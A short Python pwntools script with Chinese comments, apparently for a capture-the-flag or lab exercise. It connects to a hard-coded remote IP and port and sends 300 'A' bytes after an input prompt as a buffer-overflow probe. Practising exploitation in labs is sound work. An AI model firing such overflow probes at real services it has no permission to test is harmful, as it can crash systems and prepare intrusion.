import pwn

# 连接远程服务器
r = pwn.remote("124.16.75.117", 51003)

payload = b"A" * 300


# 发送payload
r.sendlineafter("Input:\n", payload)
# 接收结果
result = r.recvline()
# 打印结果
print(result.decode())
